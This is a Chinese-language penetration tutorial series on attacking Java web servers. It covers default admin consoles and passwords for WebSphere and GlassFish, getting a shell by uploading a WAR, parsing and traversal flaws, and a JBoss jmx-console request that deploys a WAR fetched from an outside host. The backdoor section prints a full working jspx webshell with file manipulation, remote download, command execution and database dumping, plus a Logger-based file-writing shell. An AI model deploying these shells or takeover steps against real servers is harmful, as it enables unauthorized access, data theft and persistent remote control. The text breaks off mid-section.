Websphere8.5登录页面： https://localhost:9043/ibm/console/logon.jsp

[enter link description here](http://static.wooyun.org/20141017/2014101711455610557.png)

Websphere8.5 WEB控制台：

![enter image description here](http://drops.leesec.com/wooyun-img/eeb9f09d5aecc16ae270373fa2db63e20f221402.jpg)

Websphere6-7默认控制台地址也是： http://localhost:9043/ibm/console，此处用admin登录即可。

![enter image description here](http://drops.leesec.com/wooyun-img/c221ead42d069071fb663798f3f96cc88999ddab.jpg)

### Websphere GetShell

本地只安装了8.5测试，Websphere安装的确非常坑非常麻烦。不过Google HACK到了其余两个版本Websphere6和Websphere7。测试发现Websphere GetShell一样很简单，只是比较麻烦，一般情况直接默认配置Next就行了。Websphere7和Websphere8 GetShell基本一模一样。

#### Websphere6 GetShell

需要注意的是Websphere6默认支持的Web应用是2.3(web.xml配置的web-app_2_3.dtd)直接上2.5是不行的，请勿霸王硬上弓。其次是在完成部署后记得保存啊亲，不然无法生效。

![enter image description here](http://drops.leesec.com/wooyun-img/5716b0ac220aba67632bcb36b46691d273c9640a.jpg)

#### Websphere8.5 GetShell

部署的时候记得写上下文名称哦，不让无法请求到Shell。

![enter image description here](http://drops.leesec.com/wooyun-img/f36e0e7aecd925d0f80f2bc4a95cf008e7334cf8.jpg)

注意：

如果在Deploy低版本的Websphere的时候可能会提示web.xml错误，这里其实是因为支持的JavaEE版本限制，把war包里面的web.xml改成低版本就行了，如把app2.5改成2.3。

```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd"><web-app>    <welcome-file-list>        <welcome-file>index.jsp</welcome-file>    </welcome-file-list></web-app>
```

## GlassFish

---

GlassFish是SUN的产品，但是作为一只优秀的土鳖SUN已经被Oracle收购了，GlassFish的性能优越对JavaEE的支持自然最好，最新的Servlet3.1仅GlassFish支持。

### GlassFish版本

GlassFish版本比较低调，最高版本GlassFish4可在官网下载： http://glassfish.java.net/ 。最新4.x版刚发布不久。所以主流版本应当还是v2-3,3应该更多。支持php(v3基于Quercus),jRuby on Rails 和 Phobos等多种语言。

### GlassFish 默认配置

默认Web控制后台： http://localhost:4848

默认管理密码： GlassFish2默认帐号admin密码adminadmin 。

GlassFish3、4 如果管理员不设置帐号本地会自动登录，但是远程访问会提示配置错误。

```vbnet
Configuration Error Secure Admin must be enabled to access the DAS remotely.
```

默认端口：

```undefined
使用Admin的端口 4848。使用HTTP Instance的端口 8080。使用JMS的端口 7676。使用IIOP的端口 3700。使用HTTP_SSL的端口 8181。使用IIOP_SSL的端口 3820。使用IIOP_MUTUALAUTH的端口 3920。使用JMX_ADMIN的端口 8686。使用OSGI_SHELL的默认端口 6666。使用JAVA_DEBUGGER的默认端口 9009。
```


# 攻击JavaWeb应用、Server篇（下）

## 0x01 WebServer

---

Web服务器可以解析(handles)HTTP协议。当Web服务器接收到一个HTTP请求(request)，会返回一个HTTP响应(response)，例如送回一个HTML页面。

Server篇其实还缺少了JBOSS和Jetty，本打算放到`Server[2]`写的。但是这次重点在于和大家分享B/S实现和交互技术。`Server[1]`已经给大家介绍了许多由Java实现 的WebServer相信小伙伴们对Server的概念不再陌生了。Web服务器核心是根据HTTP协议解析(Request)和处理(Response)来自客户端的请求，怎样去解析和响应来自客户端的请求正是我们今天的主题。

### B/S交互

￼![enter image description here](http://drops.leesec.com/wooyun-img/40675e9a10c5583f6a36bfe8e40b5e84866aadda.jpg)

浏览器发送HTTP请求。经Internet连接到对应服务器。服务器解析并处理Http请求，返回处理结果到浏览器。浏览器解析服务器返回的数据并显示解析后的网页。

在学习之前需要了解浏览器和Server工作原理，比如什么是HTTP协议什么是Socket。对于更底层的协议暂不提及。

### HTTP协议

HTTP的发展是万维网协会（World Wide Web Consortium）和Internet工作小组（Internet Engineering Task Force）合作的结果，（他们）最终发布了一系列的RFC，其中最著名的RFC 2616，定义了HTTP协议中现今广泛使用的一个版本—HTTP 1.1。

详情： http://www.w3.org/Protocols/

请求http://www.google.com:

￼![enter image description here](http://drops.leesec.com/wooyun-img/21b8d262ce6ea2df1af9580ff1680e59e1c5e6e4.jpg)

客户端浏览器发送了一个HTTP请求， 第一行GET / HTTP/1.1即：以GET方式请求“ /” 目录HTTP/1.1是请求的HTTP协议版本。而Google返回的则是一个基于HTTP协议的响应，其中包括了状态码、内容长度、服务器版本、以及返回内容类型等。客户端浏览器发送了一个请求(HttpRequest)，Google服务器返回处理(Handling Request)并响应(HttpResponse)了这个请求。

通俗的说HTTP协议是一种固定的请求格式，只要按照固定的格式去发送请求，服务器就可以按照固定的方式去处理来自客户端的请求。

### Socket：

Socket是应用层与TCP/IP协议族通信的中间软件抽象层，它是一组接口。Socket通常也称作”套接字"，用于描述IP地址和端口，是一个通信链的句柄。在Internet上的主机一般运行了多个服务软件，同时提供几种服务。每种服务都打开一个Socket，并绑定到一个端口上，不同的端口对应于不同的服务。  
 ￼ ![enter image description here](http://drops.leesec.com/wooyun-img/e32c3c4ff67592e2a303d06b07aca3a5f5393fbf.jpg)

## 0x01 Java实现Web Server

---

Oracle提供了一个基础包:java.net用来实现网络应用程序开发。提供了阻塞的Socket和、非阻塞的SocketChannel、URL等。 客户端通过Socket与服务器端建立连接，然后客户端发送请求内容到服务器。服务器接收到请求返回给客户端，请求完成后断开连接。

### 1、Client

发送一个非标准的HTTP请求内容为”Hello...”给SAE服务器:  
￼ ![enter image description here](http://drops.leesec.com/wooyun-img/e827dd731e96aca8fcbd40671c5d95bd5992d882.jpg)

请求首先到达了对方监听80端口的nginx，在发现客户端发送的内容不符合HTTP请求规范的同时返回了一个400错误(400 Bad Request)。 发送一个合法的HTTP请求(不截图了，把上面的Hello...换成了req)，即发送：

```swift
"GET / HTTP/1.1\r\n"+"Host: www.wooyun.org\r\n"+"Connection: keep-alive\r\n"+"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"+"Cookie: bdshare_firstime=1387989676924\r\n\r\n”;
```

服务器返回信息：  
 ￼ ![enter image description here](http://drops.leesec.com/wooyun-img/f1ff3a0bf902d9aa4d588bec572bddb9e5cdaba3.jpg)

两次请求的差异在于是否按照HTTP协议发送，当我们随意向目标端口发送请求时，返回了一个错误请求结果。当发送符合HTTP协议的请求时服务器返回了正确的处理结果。所以只需按照HTTP协议去解析请求和响应即可。与此同时不难看出请求头的任何内容都是可以伪造的，这也是之前写cs交互的时候提到为什么不要信任来自客户端的任意请求的根本原因。现在尝试着写一个Server，去解析来自浏览器的请求。

除了使用上面的“冗余代码”去发送HTTP请求，你还可以用oracle自带的URL包去发送HTTP请求会更加简单。通过setRequestProperties一样可以修改请求头。用getHeaderFields就能获取到响应头信息了。

### 2、简单HTTP服务器实现

需再一次看下上面Socket流程图，在服务器上监听某个端口(listen)，等待请求(accept)。一旦有连接到达就开始读取请求内容(read)，然后处理并输出响应内容(write)，最后close。服务器端核心业务是获取请求、解析请求、处理请求、返回响应。

Server.java核心代码:  
 ￼ ![enter image description here](http://drops.leesec.com/wooyun-img/fc58a51c71bb67fc88aec0ecbf5910b047b87767.jpg)

浏览器请求：http://192.168.199.240:9527/wooyun.jsp?user=yzmm2&pass=123  
￼ ![enter image description here](http://drops.leesec.com/wooyun-img/aa44d785bc3da6ea280825c017f5c7f41a6928e5.jpg)

浏览器请求头：

```vbnet
GET /wooyun.jsp?user=yzmm&pass=123 HTTP/1.1Host: 192.168.199.240:9527Connection: keep-aliveCache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8
```

现在需要做的是解析请求。在Server里面有一段解析请求的代码：`Request req = new Request().parserRequest(sb.toString());//`解析请求。具体的需要解析的内容包括：请求头(Header)、请求参数(Parameter)、请求的URI(RequestURI)等。如果是文件上传请求的话还得解析具体的内容(form-data)。 在解析的整个过程没看过RFC文档，只是根据个人理解去实现请求解析，有不对的地方见谅。

首先用换行符切开请求头，得到如下结果：`GET /wooyun.jsp?user=yzmm&pass=123 HTTP/1.1`。可见这里是按空格隔开的，用正则的\s就可以切开了当前行了。这样就能简单的拿到:`[GET, /wooyun.jsp?user=yzmm&pass=123, HTTP/1.1]`把他们保存到类的成员变量以便后面调用。

解析请求头比较简单，只需把请求头内容按照key、value方式解析出来就行了。比如：`Host: localhost:9527`，解析后就成了`key＝Host，value＝localhost:9527`。parserGET方法就更简单了，把 `/wooyun.jsp?user=yzmm&pass=123`以”?”号切开后再以”＝”号切开，最终得到的是`key=user,value=yzmm、key＝pass，value＝123`。

￼![enter image description here](http://drops.leesec.com/wooyun-img/ff85620819323574cbc8805ad70af89efec89af7.jpg)

![enter image description here](http://drops.leesec.com/wooyun-img/94294b8aaef1eb02a5d711e5865f54ee871839e7.jpg) ￼ 处理结果都装在了如下变量：

```vbnet
#!javaprivate String method;private String queryString;private String requstURI;private String host;private Map<String, Object> formContent = new LinkedHashMap<String, Object>();private Map<String, Object> header = new LinkedHashMap<String, Object>();private Map<String, Object> parameter = new LinkedHashMap<String, Object>();private Map<String, Object> multipart = new LinkedHashMap<String, Object>();
```

如果想取出请求参数可以用parameter.get(“xxxx”)就行了，是不是跟javaee有那么些相似了？当请求解析完成后需要去加载请求的文件，比如这里的wooyun.jsp。

当请求处理完后调用getResponse方法把结果输出到浏览器：

```swift
#!javapublic String getResponse(String content){        return "HTTP/1.1 200 OK\r\n"+               "server: "+Constants.SYS_CONFIG_NAME+"\r\n"+               "Date: "+new Date()+"\r\n"+               "X-Powered-By-yzmm: "+Constants.SYS_CONFIG_VERSION+"\r\n"+               "Content-Type: text/html\r\n"+               "Content-Length: "+(content!=null?content.length():0)+"\r\n\r\n"+               content;}
```

从上可见服务器的响应信息也是可以任意的。比如我修改了响应中的server的值你就会在浏览器的Response当中看到当前的server是: z7y-server。出现在响应头里面有意思的漏洞有：CRLF注入，有兴趣的小伙伴儿可以了解下。

### 0x02 文件上传请求解析

---

文件上传请求和普通的GET、POST不一样，在JavaEE里面会把multipart请求封装成一个InputStream对象。如果想要从请求里面解析具体的文件内容需要读取流。值得注意的是multipart/form-data中的input域也会包含在InputStream里面。在JavaEE里面可以用：request.getInputStream();或request.getReader();方法获取。

```xml
#!html<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><title>File Upload</title></head><body>    <form action="http://192.168.199.240:9527/wooyun.jsp?user=zsy&pass=123" method="post" enctype="multipart/form-data">        1<input type="checkbox" value="1" name="i" checked="checked" /> 2<input type="checkbox" value="2" name="i" checked="checked" /><br/>        <input type="file" name="file" /><br/>        <input type="text" value="<script>alert('你好.');</script>" name="name" style="width:250px;" / ><br/>        <input type="submit" value="sub" />    </form></body></html>
```

![enter image description here](http://drops.leesec.com/wooyun-img/8afa3136ac7e63fa140f4844f4c4f949603bc361.jpg)

文件域下方Content-Type: text/html实际上隐藏了upload.html的内容，chrome不会在那儿显示。判定一个请求是否是文件上传只需从请求头里面取出Content-Type就行了，如果type是multipart/form-data;即标识当前请求类型是文件上传。

关于文件上传请求解析，我写的比较粗暴了。按照分割线分别把内容域和文件域提取出来，并封装到multipart map里面，它们的key分别是file和para。 ￼ ![enter image description here](http://drops.leesec.com/wooyun-img/6c3c68257f6b6530fd3391978de2a8df2a43aedc.jpg)

写文件到”服务器”： ￼ ![enter image description here](http://drops.leesec.com/wooyun-img/68401f4908048a7e8813561d8f12e11151350134.jpg)

### 文件上传请求安全问题

值得注意的是假如一个文件上传和input域同时出现的情况下，跨站和Sql注入几率会非常的高。因为文件上传会把input域的请求参数封装到流里面，很多时候并没有人会去处理这样的恶意请求。

类似的案例： [WooYun: 360网站宝/安全宝/加速乐及其他类似产品防护绕过缺陷之一](http://www.wooyun.org/bugs/wooyun-2013-044349) 。漏洞提交者在文件上传请求中传递了SQL注入语句，而上面的安全软件的拦截都失效了。。。

据说在PHP里面还存在另外一个问题，文件上传的input域请求会被解析到对应的POST请求对象当中。那么也就是说假设一个站拦截了普通的GET、POST请求，但是没有拦截文件上传的恶意请求。仅需要简单的构造一个上传并传递注入语句就绕过了所谓的防御了。

## 0x03 文件或虚拟路径请求和处理

---

### 虚拟路径请求处理

在Servlet里面一个Servlet映射的是一个虚拟的路径。比如请求:http://xxx /servlet/hello。这个servlet/hello并不是一个实际存在的文件地址。所以我们请求的wooyun.jsp可以是真实存在的一个文件，也可以是一个虚拟的路径。比如当客户端请求wooyun.jsp的时候我们把请求交给Controller去处理(仿MVC)：  
 ￼ ![enter image description here](http://drops.leesec.com/wooyun-img/5b74e5738c82d8e7da5a9879f6d3d5a200f17f15.jpg)

而我们的控制层假设做了一个请求校验：当user等于yzmm的时候输出Good!，否则输出Error. ￼  
  ![enter image description here](http://drops.leesec.com/wooyun-img/2960594611aff77cf3f26eff3f8df9f6babb89ef.jpg)

分别请求：http://192.168.199.240:9527/wooyun.jsp?user=yzmm&pass=123和user＝zsy输出都是正常的。  
 ￼ ![enter image description here](http://drops.leesec.com/wooyun-img/827b761434722a02c3ba8f27313a3c928b395485.jpg)

### 普通的文件请求

假如用户请求的不是虚拟路径而是一个实际存在的文件呢？这个时候就需要把服务器的文件内容读取并返回给客户端。比如把Contoller注掉改为content = readFile(request);这次去读取ROOT下的wooyun.jsp内容。  
 ￼ ![enter image description here](http://drops.leesec.com/wooyun-img/e109f87f10d1d8bf2604905dab91c5e50583b00e.jpg)

这次输出了”用户目录/webapps/zsy/ROOT/wooyun.jsp”内容。

## 0x04 Server安全问题

---

### 文件解析漏洞

服务器在处理请求或其本身可能存在一些安全问题。经典的比如IIS、Nginx解析漏洞。那么是什么原因让Server变得这么”不安全”呢?

在之前的系列里面讲过如果把Tomcat的web.[xml](https://so.csdn.net/so/search?q=xml&spm=1001.2101.3001.7020)的filter添加任意后缀到servlet-name为jsp的Servlet当中，那么所有后缀为.txt的请求都会被当作jsp解析！ ￼  
![enter image description here](http://drops.leesec.com/wooyun-img/b0da1f719ae35e4aeab0131de2109372995fb242.jpg)

假设Tomcat在写正则的时候一不小心写成了：

```python
#!javaPattern.compile("\\.jsp").matcher("1.jsp.jpg").find();
```

那么所有的1.jsp.jpg的请求都会交给jsp对应的servlet处理。跟这类似的漏洞apache曾经就出现过。问题是apache如果在mime.types文件里面没有定义的扩展名，会给解析成倒数第二个定义的扩展名。

### 文件读取漏洞

好吧，这个Tomcat做的有点奇葩。在某些低版本的Tomcat当请求目录并没有找到对应的索引文件，且web.xml的listings是true。于是Tom猫就干脆列出这个目录的所有文件。

Tomcat还出过另一个低级漏洞，当请求的文件是UTF-8编码的时候会造成任意文件遍历漏洞。触发的条件为Apache Tomcat的配置文件context.xml 或 server.xml 的'allowLinking' 和 'URIencoding' 允许'UTF-8'选项

### War文件部署漏洞

很多时候需要在线上部署一个新的应用时可以在Server的控制台去动态的部署一个war文件（其实就是一个压缩文件包）。Server会自动解压并部署。这虽说是非常的方便，但是却因为Server各自的实现不一或者自身安全意思淡漠导致任意的war文件都可以远程部署到Server中去。这里面的典型代表就是Jboss。请求：

```crystal
http://192.168.0.113:8080/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://www.ahack.net/iswin.war
```

成功后访问：`http://192.168.0.113:8080/iswin/index.jsp` 菜刀连接（默认包含index.jsp、index.jspx、index.jspf、cmd.jsp三个shell）。

测试版本：jboss-6.1.0.Final。http://p2j.cn/?p=342

![enter image description here](http://drops.leesec.com/wooyun-img/bbb06b6785922d4ee5574a28e6e4a3ba6ef04d14.jpg)

控制台输出信息：  
 ￼ ![enter image description here](http://drops.leesec.com/wooyun-img/5554adcccf9d266e9a9b3c09f5ccd38385d1c45a.jpg)

这货去年十月还出过一个高危的漏洞，同样是远程war部署。

Apache Tomcat/JBoss EJBInvokerServlet / JMXInvokerServlet (RMI over HTTP) Marshalled Object RCE

详情： [http://www.exploit-db.com/exploits/28713/](http://www.exploit-db.com/exploits/28713/) [http://zone.wooyun.org/content/7398](http://zone.wooyun.org/content/7398)

除了上述漏洞某些Server还出过拒绝服务漏洞、控制台弱口令漏洞、爆路径漏洞、WebDAV、XSS等漏洞。可谓想做好一个WebServer是非常的艰难。

## 0x05 Server漏洞防御

---

在总结了之前的Server安全问题之后，我们有没有想过怎么去防御来自客户端的攻击呢？我们应该如何去防御？这里仅简要介绍防范思路至于防御细节，对不起请自行实现。

防御方式：

```scss
1、由远及近，从CDN层我们可以拦截所有的恶意请求。可以尝试在请求到达服务器之前净化请求信息。2、从网络层可以用硬防处理恶意请求。3、从服务器层可以写对应的Server拓展(Filter)拦截恶意请求。4、安装服务器安全软件。5、在应用层需要尽可能的注重代码编写，如果无法确保安全性可以在应用层写一个安全过滤器。
```

从实现的角度来说前两者的成本较高，效果或许并不会特别明显，后面几种方式显得更轻。


# 攻击JavaWeb应用、后门篇
## 0x00 背景

---

关于JavaWeb后门问题一直以来都比较少，而比较新奇的后门更少。在这里我分享几种比较有意思的JavaWeb后门给大家玩。

## 0x01 jspx后门

---

在如今的web应用当中如果想直接传个jsp已经变得比较难了，但是如果只限制了asp、php、jsp、aspx等这些常见的后缀应该怎样去突破呢？我在读tomcat的配置文件的时候看到jsp和jspx都是由org.[apache](https://so.csdn.net/so/search?q=apache&spm=1001.2101.3001.7020).jasper.servlet.JspServlet处理，于是想构建一个jspx的webshell。经过反复的折腾，一个jspx的后门就出现了。测试应该是java的所有的server都默认支持。 

### Tomcat默认的conf/web.xml下的配置： 

```xml
   <servlet>        <servlet-name>jsp</servlet-name>        <servlet-class>org.apache.jasper.servlet.JspServlet</servlet-class>        <init-param>            <param-name>fork</param-name>            <param-value>false</param-value>        </init-param>        <init-param>            <param-name>xpoweredBy</param-name>            <param-value>false</param-value>        </init-param>        <load-on-startup>3</load-on-startup>    </servlet>     <servlet-mapping>        <servlet-name>jsp</servlet-name>        <url-pattern>*.jsp</url-pattern>        <url-pattern>*.jspx</url-pattern>    </servlet-mapping>
```

关于jspx的资料网上并不多，官网给的文档也不清楚，搞的模模糊糊的。怎么去玩jspx大家可以看下官网的demo，或者参考一些文章。

[http://jspx-bay.sourceforge.net](http://jspx-bay.sourceforge.net/)

 关于jspx文件的一些说明：

[http://blog.sina.com.cn/s/blog_4b6de6bb0100089s.html](http://blog.sina.com.cn/s/blog_4b6de6bb0100089s.html)

  重点在于把Jsp里面的一些标记转换成xml支持的格式，比如：

```scss
<%@ include .. %>                      <jsp:directive.include .. /> <%@ page .. %>                         <jsp:directive.page .. /><%@ taglib .. %>                       xmlns:prefix="tag library URL"<%= ..%>                               <jsp:expression> .. </jsp:expression><% ..%>                                <jsp:scriptlet> .. </jsp:scriptlet>
```

知道<% %="">可以用`<jsp:scriptlet></jsp:scriptlet>`标记表示那么做起来就很简单了，直接把标记换下是非常容易做的。所以写个简单的shell一个就很简单了，但是如果想知道具体有那些标签或者说跟jsp里面的有那些不同怎么办呢？下面我简单的做了下对比（前面是jsp的代码提示，后面是jspx）：

![enter image description here](http://drops.leesec.com/wooyun-img/9d7cd30ee84cc5d58f5f6551e2b6782b55340db0.jpg)

照着提示翻译下得知表示jsp里面的<%! %="">需要用：`<jsp:declaration></jsp:declaration>`标签去替换就行了。 

### 其他重要提醒：

在jspx里面遵循xml语法所以直接在jsp:declaration或者jsp:scriptlet标签内写"<>"这样的符号是不行的，需要转意（不转意会报编译错误，猜了下只需要把<>转成`&lt;   &gt;`就行了）。 

### jspx后门的具体实现代码：

```css
    <jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"    xmlns="http://www.w3.org/1999/xhtml"    xmlns:c="http://java.sun.com/jsp/jstl/core" version="1.2">    <jsp:directive.page contentType="text/html" pageEncoding="UTF-8" />    <jsp:directive.page import="java.io.*" />    <jsp:scriptlet>        RandomAccessFile rf = new RandomAccessFile(request.getRealPath("/")+request.getParameter("f"), "rw");        rf.write(request.getParameter("t").getBytes());        rf.close();    </jsp:scriptlet></jsp:root>
```

### jspx实现的我之前发的菜刀最终版：  

[http://localhost:8080/jspx.jspx](http://localhost:8080/jspx.jspx)  ￼ 直接用菜刀连接：

![enter image description here](http://drops.leesec.com/wooyun-img/f27ac24a67e020b4ef3db3c7ade309c13804bc30.jpg)

```java
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" xmlns:c="http://java.sun.com/jsp/jstl/core" version="1.2"><jsp:directive.page contentType="text/html" pageEncoding="UTF-8" /><jsp:directive.page import="java.io.*"/><jsp:directive.page import="java.util.*"/><jsp:directive.page import="java.net.*"/><jsp:directive.page import="java.sql.*"/><jsp:directive.page import="java.text.*"/><jsp:declaration>String Pwd="023";String cs="UTF-8";String EC(String s)throws Exception{return new String(s.getBytes("ISO-8859-1"),cs);}Connection GC(String s)throws Exception{String[] x=s.trim().split("\r\n");Class.forName(x[0].trim());if(x[1].indexOf("jdbc:oracle")!=-1){return DriverManager.getConnection(x[1].trim()+":"+x[4],x[2].equalsIgnoreCase("[/null]")?"":x[2],x[3].equalsIgnoreCase("[/null]")?"":x[3]);}else{Connection c=DriverManager.getConnection(x[1].trim(),x[2].equalsIgnoreCase("[/null]")?"":x[2],x[3].equalsIgnoreCase("[/null]")?"":x[3]);if(x.length>4){c.setCatalog(x[4]);}return c;}}void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i<r.length;i++){sb.append(r[i].toString().substring(0,2));}}void BB(String s,StringBuffer sb)throws Exception{File oF=new File(s),l[]=oF.listFiles();String sT,sQ,sF="";java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");for(int i=0; i<l.length; i++){dt=new java.util.Date(l[i].lastModified());sT=fm.format(dt);sQ=l[i].canRead()?"R":"";sQ +=l[i].canWrite()?" W":"";if(l[i].isDirectory()){sb.append(l[i].getName()+"/\t"+sT+"\t"+l[i].length()+"\t"+sQ+"\n");}else{sF+=l[i].getName()+"\t"+sT+"\t"+l[i].length()+"\t"+sQ+"\n";}}sb.append(sF);}void EE(String s)throws Exception{File f=new File(s);if(f.isDirectory()){File x[]=f.listFiles();for(int k=0; k < x.length; k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)throws Exception{int n;byte[] b=new byte[512];r.reset();ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));os.write(("->"+"|").getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write(("|"+"<-").getBytes(),0,3);os.close();is.close();}void GG(String s,String d)throws Exception{String h="0123456789ABCDEF";File f=new File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0; i<d.length();i+=2){os.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d.charAt(i+1))));}os.close();}void HH(String s,String d)throws Exception{File sf=new File(s),df=new File(d);if(sf.isDirectory()){if(!df.exists()){df.mkdir();}File z[]=sf.listFiles();for(int j=0; j<z.length; j++){HH(s+"/"+z[j].getName(),d+"/"+z[j].getName());}}else{FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}is.close();os.close();}}void II(String s,String d)throws Exception{File sf=new File(s),df=new File(d);sf.renameTo(df);}void JJ(String s)throws Exception{File f=new File(s);f.mkdir();}void KK(String s,String t)throws Exception{File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s,String d)throws Exception{URL u=new URL(s);int n=0;FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection) u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];while((n=is.read(b))!=-1){os.write(b,0,n);}os.close();is.close();h.disconnect();}void MM(InputStream is,StringBuffer sb)throws Exception{String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));while((l=br.readLine())!=null){sb.append(l+"\r\n");}}void NN(String s,StringBuffer sb)throws Exception{Connection c=GC(s);ResultSet r=s.indexOf("jdbc:oracle")!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();while(r.next()){sb.append(r.getString(1)+"\t");}r.close();c.close();}void OO(String s,StringBuffer sb)throws Exception{Connection c=GC(s);String[] x=s.trim().split("\r\n");ResultSet r=c.getMetaData().getTables(null,s.indexOf("jdbc:oracle")!=-1?x.length>5?x[5]:x[4]:null,"%",new String[]{"TABLE"});while(r.next()){sb.append(r.getString("TABLE_NAME")+"\t");}r.close();c.close();}void PP(String s,StringBuffer sb)throws Exception{String[] x=s.trim().split("\r\n");Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery("select * from "+x[x.length-1]);ResultSetMetaData d=r.getMetaData();for(int i=1;i<=d.getColumnCount();i++){sb.append(d.getColumnName(i)+" ("+d.getColumnTypeName(i)+")\t");}r.close();m.close();c.close();}void QQ(String cs,String s,String q,StringBuffer sb,String p)throws Exception{Connection c=GC(s);Statement m=c.createStatement(1005,1008);BufferedWriter bw=null;try{ResultSet r=m.executeQuery(q.indexOf("--f:")!=-1?q.substring(0,q.indexOf("--f:")):q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(int i=1; i <=n; i++){sb.append(d.getColumnName(i)+"\t|\t");}sb.append("\r\n");if(q.indexOf("--f:")!=-1){File file=new File(p);if(q.indexOf("-to:")==-1){file.mkdir();}bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf("-to:")!=-1?p.trim():p+q.substring(q.indexOf("--f:")+4,q.length()).trim()),true),cs));}while(r.next()){for(int i=1; i<=n;i++){if(q.indexOf("--f:")!=-1){bw.write(r.getObject(i)+""+"\t");bw.flush();}else{sb.append(r.getObject(i)+""+"\t|\t");}}if(bw!=null){bw.newLine();}sb.append("\r\n");}r.close();if(bw!=null){bw.close();}}catch(Exception e){sb.append("Result\t|\t\r\n");try{m.executeUpdate(q);sb.append("Execute Successfully!\t|\t\r\n");}catch(Exception ee){sb.append(ee.toString()+"\t|\t\r\n");}}m.close();c.close();}</jsp:declaration><jsp:scriptlet>cs=request.getParameter("z0")!=null?request.getParameter("z0")+"":cs;response.setContentType("text/html");response.setCharacterEncoding(cs);StringBuffer sb=new StringBuffer("");try{String Z=EC(request.getParameter(Pwd)+"");String z1=EC(request.getParameter("z1")+"");String z2=EC(request.getParameter("z2")+"");sb.append("->"+"|");String s=request.getSession().getServletContext().getRealPath("/");if(Z.equals("A")){sb.append(s+"\t");if(!s.substring(0,1).equals("/")){AA(sb);}}else if(Z.equals("B")){BB(z1,sb);}else if(Z.equals("C")){String l="";BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));while((l=br.readLine())!=null){sb.append(l+"\r\n");}br.close();}else if(Z.equals("D")){BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));bw.write(z2);bw.close();sb.append("1");}else if(Z.equals("E")){EE(z1);sb.append("1");}else if(Z.equals("F")){FF(z1,response);}else if(Z.equals("G")){GG(z1,z2);sb.append("1");}else if(Z.equals("H")){HH(z1,z2);sb.append("1");}else if(Z.equals("I")){II(z1,z2);sb.append("1");}else if(Z.equals("J")){JJ(z1);sb.append("1");}else if(Z.equals("K")){KK(z1,z2);sb.append("1");}else if(Z.equals("L")){LL(z1,z2);sb.append("1");}else if(Z.equals("M")){String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals("N")){NN(z1,sb);}else if(Z.equals("O")){OO(z1,sb);}else if(Z.equals("P")){PP(z1,sb);}else if(Z.equals("Q")){QQ(cs,z1,z2,sb,z2.indexOf("-to:")!=-1?z2.substring(z2.indexOf("-to:")+4,z2.length()):s.replaceAll("\\\\","/")+"images/");}}catch(Exception e){sb.append("ERROR"+":// "+e.toString());}sb.append("|"+"<-");out.print(sb.toString());</jsp:scriptlet></jsp:root>
```

## 0x02 Java Logger日志后门

---

某些场景下shell可能被过滤掉了，但是利用一些有趣的东东可以绕过，比如不用new File这样的方式去写文件，甚至是尽可能的不要出现File关键字。

看了下java.util.logging.Logger挺有意思的，可以写日志文件，于是试了下用这样的方式去写一个shell，结果成功了。  

java.util.logging.Logger默认输出的格式是xml，但这都不是事，直接格式化下日志以text方式输出就行了。  

新建2.jsp并访问： 

```vbscript
<%java.util.logging.Logger l=java.util.logging.Logger.getLogger("t");java.util.logging.FileHandler h=new java.util.logging.FileHandler(pageContext.getServletContext().getRealPath("/")+request.getParameter("f"),true);h.setFormatter(new java.util.logging.SimpleFormatter());l.addHandler(h);l.info(request.getParameter("t"));%>
```

![enter image description here](http://drops.leesec.com/wooyun-img/933d5a1cdeee3eefe9b839b1a2937ed4e9a31d5a.jpg)

### 其他略特殊点的文件读写Demo：

```java
new FileOutputStream           new FileOutputStream("d:/sb.txt").write(new String("123").getBytes());           new DataOutputStream           new DataOutputStream(new FileOutputStream("d:/1x.txt")).write(new String("123").getBytes()); FileWriter fw = new FileWriter("d:/3.txt");             fw.write("21");             fw.flush();             fw.close(); RandomAccessFile rf = new RandomAccessFile("d:/14.txt", "rw");             rf.write(new String("3b").getBytes());             rf.close();
```

### GetShell.htm: 

```xml
